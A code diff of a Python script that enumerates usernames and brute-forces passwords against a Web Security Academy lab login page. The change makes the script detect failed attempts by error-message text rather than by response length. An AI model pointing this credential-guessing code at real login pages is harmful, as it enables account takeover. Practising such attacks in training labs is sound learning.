@@ -21,11 +21,11 @@ from dotenv import load_dotenv
 load_dotenv()
 
 # Endpoint URL
-URL = 'https://0a20002304760ded817e2f32005b0003.web-security-academy.net/login'
+URL = 'https://0abb00d8035689038174118d006e0089.web-security-academy.net/login'
 
 # Named constants for response lengths observed during analysis
-NON_VALID_USER_RESPONSE_LENGTH = 3140
-NON_VALID_PASSWORD_RESPONSE_LENGTH = 3142
+NON_VALID_USER_RESPONSE = "Invalid username or password."
+NON_VALID_USER_RESPONSE_PASSWORD = "Invalid username or password"
 
 # Configure basic logging
 logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
@@ -98,7 +98,7 @@ def bruteforce_usernames(usernames: list[str], URL: str) -> list[str]:
     '''
 
     # Observed behaviour in Burp Suite: invalid username responses are consistently
-    # NON_VALID_USER_RESPONSE_LENGTH with HTTP 200
+    # NON_VALID_USER_RESPONSE "Invalid username or password." with HTTP 200
     valid_users: list[str] = []
 
     for username in usernames:
@@ -110,7 +110,7 @@ def bruteforce_usernames(usernames: list[str], URL: str) -> list[str]:
 
         logging.info(f'Testing username: {username} -> HTTP {response.status_code}, response length {len(response.text)}')
 
-        if (response.status_code == 200) and (len(response.text) != NON_VALID_USER_RESPONSE_LENGTH):
+        if (response.status_code == 200) and (NON_VALID_USER_RESPONSE not in response.text):
             valid_users.append(username)
             logging.info(f'[+] Username found: {username} -> HTTP {response.status_code}, response length {len(response.text)}')
 
@@ -145,7 +145,7 @@ def bruteforce_passwords(usernames: list[str], passwords: list[str], URL: str) -
 
             logging.info(f'Testing credentials: {username}:{password} -> HTTP {response.status_code}, response length {len(response.text)}')
 
-            if (len(response.text) != NON_VALID_PASSWORD_RESPONSE_LENGTH):
+            if (response.status_code == 200) and (NON_VALID_USER_RESPONSE_PASSWORD not in response.text):
                 valid_credentials[username] = password
                 logging.info(f'[+] Valid credentials: {username}:{password} -> HTTP {response.status_code}, response length {len(response.text)}')
                 
